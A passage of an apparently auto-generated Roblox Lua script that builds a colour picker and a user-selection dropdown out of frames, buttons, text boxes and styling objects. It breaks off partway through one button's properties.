G2L["2d8"]["PaddingRight"] = UDim.new(0, 3);
G2L["2d8"]["PaddingLeft"] = UDim.new(0, 3);
G2L["2d8"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.canvashue.hueFrame
G2L["2d9"] = Instance.new("Frame", G2L["2d2"]);
G2L["2d9"]["BorderSizePixel"] = 0;
G2L["2d9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2d9"]["Size"] = UDim2.new(0, 20, 1, 0);
G2L["2d9"]["Position"] = UDim2.new(1, -20, 0, 0);
G2L["2d9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2d9"]["Name"] = [[hueFrame]];
G2L["2d9"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.canvashue.hueFrame.hue
G2L["2da"] = Instance.new("TextButton", G2L["2d9"]);
G2L["2da"]["TextTransparency"] = 1;
G2L["2da"]["TextSize"] = 14;
G2L["2da"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2da"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2da"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2da"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["2da"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2da"]["Name"] = [[hue]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.canvashue.hueFrame.hue.line
G2L["2db"] = Instance.new("Frame", G2L["2da"]);
G2L["2db"]["ZIndex"] = 999999999;
G2L["2db"]["BorderSizePixel"] = 0;
G2L["2db"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2db"]["Size"] = UDim2.new(1, 0, 0, 1);
G2L["2db"]["Position"] = UDim2.new(0, 0, 0.5, 0);
G2L["2db"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2db"]["Name"] = [[line]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.canvashue.hueFrame.hue.line.UIStroke
G2L["2dc"] = Instance.new("UIStroke", G2L["2db"]);



-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.canvashue.hueFrame.UIPadding
G2L["2dd"] = Instance.new("UIPadding", G2L["2d9"]);
G2L["2dd"]["PaddingTop"] = UDim.new(0, 3);
G2L["2dd"]["PaddingRight"] = UDim.new(0, 3);
G2L["2dd"]["PaddingLeft"] = UDim.new(0, 1);
G2L["2dd"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.transparency
G2L["2de"] = Instance.new("Frame", G2L["2ca"]);
G2L["2de"]["BorderSizePixel"] = 0;
G2L["2de"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2de"]["Size"] = UDim2.new(1, 0, 0, 18);
G2L["2de"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2de"]["Name"] = [[transparency]];
G2L["2de"]["LayoutOrder"] = 3;
G2L["2de"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.transparency.transparencyFrame
G2L["2df"] = Instance.new("Frame", G2L["2de"]);
G2L["2df"]["BorderSizePixel"] = 0;
G2L["2df"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2df"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["2df"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2df"]["Name"] = [[transparencyFrame]];
G2L["2df"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.transparency.transparencyFrame.slider
G2L["2e0"] = Instance.new("TextButton", G2L["2df"]);
G2L["2e0"]["TextTransparency"] = 1;
G2L["2e0"]["TextSize"] = 14;
G2L["2e0"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2e0"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2e0"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2e0"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["2e0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2e0"]["Name"] = [[slider]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.transparency.transparencyFrame.slider.line
G2L["2e1"] = Instance.new("Frame", G2L["2e0"]);
G2L["2e1"]["ZIndex"] = 999999999;
G2L["2e1"]["BorderSizePixel"] = 0;
G2L["2e1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2e1"]["Size"] = UDim2.new(0, 1, 1, 0);
G2L["2e1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2e1"]["Name"] = [[line]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.transparency.transparencyFrame.slider.line.UIStroke
G2L["2e2"] = Instance.new("UIStroke", G2L["2e1"]);



-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.transparency.transparencyFrame.UIPadding
G2L["2e3"] = Instance.new("UIPadding", G2L["2df"]);
G2L["2e3"]["PaddingTop"] = UDim.new(0, 1);
G2L["2e3"]["PaddingRight"] = UDim.new(0, 3);
G2L["2e3"]["PaddingLeft"] = UDim.new(0, 3);
G2L["2e3"]["PaddingBottom"] = UDim.new(0, 1);


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue
G2L["2e4"] = Instance.new("Frame", G2L["2ca"]);
G2L["2e4"]["BorderSizePixel"] = 0;
G2L["2e4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2e4"]["Size"] = UDim2.new(1, 0, 0, 23);
G2L["2e4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2e4"]["Name"] = [[colorvalue]];
G2L["2e4"]["LayoutOrder"] = 4;
G2L["2e4"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.hex
G2L["2e5"] = Instance.new("Frame", G2L["2e4"]);
G2L["2e5"]["BorderSizePixel"] = 0;
G2L["2e5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2e5"]["Size"] = UDim2.new(1, -100, 1, 0);
G2L["2e5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2e5"]["Name"] = [[hex]];
G2L["2e5"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.hex.UIPadding
G2L["2e6"] = Instance.new("UIPadding", G2L["2e5"]);
G2L["2e6"]["PaddingTop"] = UDim.new(0, 2);
G2L["2e6"]["PaddingRight"] = UDim.new(0, 3);
G2L["2e6"]["PaddingLeft"] = UDim.new(0, 3);
G2L["2e6"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.hex.textbox
G2L["2e7"] = Instance.new("TextBox", G2L["2e5"]);
G2L["2e7"]["Name"] = [[textbox]];
G2L["2e7"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["2e7"]["PlaceholderColor3"] = Color3.fromRGB(201, 201, 201);
G2L["2e7"]["TextSize"] = 14;
G2L["2e7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2e7"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["2e7"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2e7"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["2e7"]["PlaceholderText"] = [[Hex color]];
G2L["2e7"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["2e7"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["2e7"]["Text"] = [[]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.hex.textbox.outlineStroke
G2L["2e8"] = Instance.new("UIStroke", G2L["2e7"]);
G2L["2e8"]["ZIndex"] = 10;
G2L["2e8"]["Thickness"] = 2;
G2L["2e8"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["2e8"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.hex.textbox.buttonFade
G2L["2e9"] = Instance.new("CanvasGroup", G2L["2e7"]);
G2L["2e9"]["BorderSizePixel"] = 0;
G2L["2e9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2e9"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2e9"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["2e9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2e9"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.hex.textbox.buttonFade.UIGradient
G2L["2ea"] = Instance.new("UIGradient", G2L["2e9"]);
G2L["2ea"]["Rotation"] = 90;
G2L["2ea"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.hex.textbox.text
G2L["2eb"] = Instance.new("UIStroke", G2L["2e7"]);
G2L["2eb"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.hex.textbox.UIPadding
G2L["2ec"] = Instance.new("UIPadding", G2L["2e7"]);
G2L["2ec"]["PaddingLeft"] = UDim.new(0, 6);


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.rgb
G2L["2ed"] = Instance.new("Frame", G2L["2e4"]);
G2L["2ed"]["BorderSizePixel"] = 0;
G2L["2ed"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2ed"]["Size"] = UDim2.new(1, -100, 1, 0);
G2L["2ed"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2ed"]["Name"] = [[rgb]];
G2L["2ed"]["LayoutOrder"] = 1;
G2L["2ed"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.rgb.UIPadding
G2L["2ee"] = Instance.new("UIPadding", G2L["2ed"]);
G2L["2ee"]["PaddingTop"] = UDim.new(0, 2);
G2L["2ee"]["PaddingRight"] = UDim.new(0, 3);
G2L["2ee"]["PaddingLeft"] = UDim.new(0, 3);
G2L["2ee"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.rgb.textbox
G2L["2ef"] = Instance.new("TextBox", G2L["2ed"]);
G2L["2ef"]["Name"] = [[textbox]];
G2L["2ef"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["2ef"]["PlaceholderColor3"] = Color3.fromRGB(201, 201, 201);
G2L["2ef"]["TextWrapped"] = true;
G2L["2ef"]["TextSize"] = 14;
G2L["2ef"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2ef"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["2ef"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2ef"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["2ef"]["PlaceholderText"] = [[RGB color]];
G2L["2ef"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["2ef"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["2ef"]["Text"] = [[]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.rgb.textbox.outlineStroke
G2L["2f0"] = Instance.new("UIStroke", G2L["2ef"]);
G2L["2f0"]["ZIndex"] = 10;
G2L["2f0"]["Thickness"] = 2;
G2L["2f0"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["2f0"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.rgb.textbox.buttonFade
G2L["2f1"] = Instance.new("CanvasGroup", G2L["2ef"]);
G2L["2f1"]["BorderSizePixel"] = 0;
G2L["2f1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2f1"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2f1"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["2f1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2f1"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.rgb.textbox.buttonFade.UIGradient
G2L["2f2"] = Instance.new("UIGradient", G2L["2f1"]);
G2L["2f2"]["Rotation"] = 90;
G2L["2f2"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.rgb.textbox.text
G2L["2f3"] = Instance.new("UIStroke", G2L["2ef"]);
G2L["2f3"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.rgb.textbox.UIPadding
G2L["2f4"] = Instance.new("UIPadding", G2L["2ef"]);
G2L["2f4"]["PaddingLeft"] = UDim.new(0, 6);


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.colorvalue.UIListLayout
G2L["2f5"] = Instance.new("UIListLayout", G2L["2e4"]);
G2L["2f5"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["2f5"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel
G2L["2f6"] = Instance.new("Frame", G2L["2ca"]);
G2L["2f6"]["BorderSizePixel"] = 0;
G2L["2f6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2f6"]["Size"] = UDim2.new(1, 0, 0, 23);
G2L["2f6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2f6"]["Name"] = [[applycancel]];
G2L["2f6"]["LayoutOrder"] = 5;
G2L["2f6"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.UIListLayout
G2L["2f7"] = Instance.new("UIListLayout", G2L["2f6"]);
G2L["2f7"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["2f7"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.apply
G2L["2f8"] = Instance.new("TextButton", G2L["2f6"]);
G2L["2f8"]["BorderSizePixel"] = 0;
G2L["2f8"]["TextTransparency"] = 1;
G2L["2f8"]["TextSize"] = 14;
G2L["2f8"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2f8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2f8"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2f8"]["BackgroundTransparency"] = 1;
G2L["2f8"]["Size"] = UDim2.new(0, 100, 1, 0);
G2L["2f8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2f8"]["Name"] = [[apply]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.apply.UIPadding
G2L["2f9"] = Instance.new("UIPadding", G2L["2f8"]);
G2L["2f9"]["PaddingTop"] = UDim.new(0, 2);
G2L["2f9"]["PaddingRight"] = UDim.new(0, 3);
G2L["2f9"]["PaddingLeft"] = UDim.new(0, 3);
G2L["2f9"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.apply.buttonFrame
G2L["2fa"] = Instance.new("Frame", G2L["2f8"]);
G2L["2fa"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["2fa"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["2fa"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["2fa"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["2fa"]["Name"] = [[buttonFrame]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.apply.buttonFrame.outlineStroke
G2L["2fb"] = Instance.new("UIStroke", G2L["2fa"]);
G2L["2fb"]["ZIndex"] = 10;
G2L["2fb"]["Thickness"] = 2;
G2L["2fb"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.apply.text
G2L["2fc"] = Instance.new("TextLabel", G2L["2f8"]);
G2L["2fc"]["ZIndex"] = 2;
G2L["2fc"]["BorderSizePixel"] = 0;
G2L["2fc"]["TextSize"] = 14;
G2L["2fc"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2fc"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2fc"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2fc"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2fc"]["BackgroundTransparency"] = 1;
G2L["2fc"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["2fc"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2fc"]["Text"] = [[Apply]];
G2L["2fc"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.apply.text.text
G2L["2fd"] = Instance.new("UIStroke", G2L["2fc"]);
G2L["2fd"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.cancel
G2L["2fe"] = Instance.new("TextButton", G2L["2f6"]);
G2L["2fe"]["BorderSizePixel"] = 0;
G2L["2fe"]["TextTransparency"] = 1;
G2L["2fe"]["TextSize"] = 14;
G2L["2fe"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2fe"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2fe"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2fe"]["BackgroundTransparency"] = 1;
G2L["2fe"]["Size"] = UDim2.new(0, 100, 1, 0);
G2L["2fe"]["LayoutOrder"] = 1;
G2L["2fe"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2fe"]["Name"] = [[cancel]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.cancel.UIPadding
G2L["2ff"] = Instance.new("UIPadding", G2L["2fe"]);
G2L["2ff"]["PaddingTop"] = UDim.new(0, 2);
G2L["2ff"]["PaddingRight"] = UDim.new(0, 3);
G2L["2ff"]["PaddingLeft"] = UDim.new(0, 3);
G2L["2ff"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.cancel.buttonFrame
G2L["300"] = Instance.new("Frame", G2L["2fe"]);
G2L["300"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["300"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["300"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["300"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["300"]["Name"] = [[buttonFrame]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.cancel.buttonFrame.outlineStroke
G2L["301"] = Instance.new("UIStroke", G2L["300"]);
G2L["301"]["ZIndex"] = 10;
G2L["301"]["Thickness"] = 2;
G2L["301"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.cancel.buttonFrame.buttonFade
G2L["302"] = Instance.new("CanvasGroup", G2L["300"]);
G2L["302"]["BorderSizePixel"] = 0;
G2L["302"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["302"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["302"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["302"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["302"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.cancel.buttonFrame.buttonFade.UIGradient
G2L["303"] = Instance.new("UIGradient", G2L["302"]);
G2L["303"]["Rotation"] = 90;
G2L["303"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.cancel.text
G2L["304"] = Instance.new("TextLabel", G2L["2fe"]);
G2L["304"]["ZIndex"] = 2;
G2L["304"]["BorderSizePixel"] = 0;
G2L["304"]["TextSize"] = 14;
G2L["304"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["304"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["304"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["304"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["304"]["BackgroundTransparency"] = 1;
G2L["304"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["304"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["304"]["Text"] = [[Cancel]];
G2L["304"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.innerframelayout.applycancel.cancel.text.text
G2L["305"] = Instance.new("UIStroke", G2L["304"]);
G2L["305"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.colorpickerFade
G2L["306"] = Instance.new("CanvasGroup", G2L["2c8"]);
G2L["306"]["BorderSizePixel"] = 0;
G2L["306"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["306"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["306"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["306"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["306"]["Name"] = [[colorpickerFade]];


-- StarterGui.T5784YHRGE89ES98T.ColorPicker.colorpickerFade.UIGradient
G2L["307"] = Instance.new("UIGradient", G2L["306"]);
G2L["307"]["Rotation"] = 90;
G2L["307"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.UIScale
G2L["308"] = Instance.new("UIScale", G2L["1"]);



-- StarterGui.T5784YHRGE89ES98T.Dropdown
G2L["309"] = Instance.new("Frame", G2L["1"]);
G2L["309"]["Visible"] = false;
G2L["309"]["ZIndex"] = 1000000010;
G2L["309"]["BorderSizePixel"] = 0;
G2L["309"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["309"]["Size"] = UDim2.new(0, 162, 0, 100);
G2L["309"]["Position"] = UDim2.new(0.60349, 0, 0.36966, 0);
G2L["309"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["309"]["Name"] = [[Dropdown]];
G2L["309"]["BackgroundTransparency"] = 0.99;


-- StarterGui.T5784YHRGE89ES98T.Dropdown.UIListLayout
G2L["30a"] = Instance.new("UIListLayout", G2L["309"]);
G2L["30a"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownSelectAll
G2L["30b"] = Instance.new("Frame", G2L["309"]);
G2L["30b"]["BorderSizePixel"] = 0;
G2L["30b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["30b"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["30b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["30b"]["Name"] = [[dropdownSelectAll]];
G2L["30b"]["LayoutOrder"] = 1;


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownSelectAll.selectall
G2L["30c"] = Instance.new("TextButton", G2L["30b"]);
G2L["30c"]["TextSize"] = 12;
G2L["30c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["30c"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["30c"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["30c"]["Size"] = UDim2.new(0.5, 0, 1, 0);
G2L["30c"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["30c"]["Text"] = [[Select All]];
G2L["30c"]["Name"] = [[selectall]];


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownSelectAll.selectall.buttonFade
G2L["30d"] = Instance.new("CanvasGroup", G2L["30c"]);
G2L["30d"]["Visible"] = false;
G2L["30d"]["BorderSizePixel"] = 0;
G2L["30d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["30d"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["30d"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["30d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["30d"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownSelectAll.selectall.buttonFade.UIGradient
G2L["30e"] = Instance.new("UIGradient", G2L["30d"]);
G2L["30e"]["Rotation"] = 90;
G2L["30e"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownSelectAll.selectall.text
G2L["30f"] = Instance.new("UIStroke", G2L["30c"]);
G2L["30f"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownSelectAll.unselectall
G2L["310"] = Instance.new("TextButton", G2L["30b"]);
G2L["310"]["TextSize"] = 12;
G2L["310"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["310"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["310"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["310"]["Size"] = UDim2.new(0.5, 0, 1, 0);
G2L["310"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["310"]["Text"] = [[Unselect All]];
G2L["310"]["Name"] = [[unselectall]];
G2L["310"]["Position"] = UDim2.new(0.5, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownSelectAll.unselectall.buttonFade
G2L["311"] = Instance.new("CanvasGroup", G2L["310"]);
G2L["311"]["Visible"] = false;
G2L["311"]["BorderSizePixel"] = 0;
G2L["311"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["311"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["311"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["311"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["311"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownSelectAll.unselectall.buttonFade.UIGradient
G2L["312"] = Instance.new("UIGradient", G2L["311"]);
G2L["312"]["Rotation"] = 90;
G2L["312"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownSelectAll.unselectall.text
G2L["313"] = Instance.new("UIStroke", G2L["310"]);
G2L["313"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownUsers
G2L["314"] = Instance.new("Frame", G2L["309"]);
G2L["314"]["BorderSizePixel"] = 0;
G2L["314"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["314"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["314"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["314"]["Name"] = [[dropdownUsers]];
G2L["314"]["LayoutOrder"] = 2;


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownUsers.display
G2L["315"] = Instance.new("TextButton", G2L["314"]);
G2L["315"]["TextWrapped"] = true;
G2L["315"]["TextSize"] = 12;
G2L["315"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["315"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["315"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["315"]["Size"] = UDim2.new(0.5, 0, 1, 0);
G2L["315"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["315"]["Text"] = [[Show Display]];
G2L["315"]["Name"] = [[display]];


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownUsers.display.buttonFade
G2L["316"] = Instance.new("CanvasGroup", G2L["315"]);
G2L["316"]["Visible"] = false;
G2L["316"]["BorderSizePixel"] = 0;
G2L["316"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["316"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
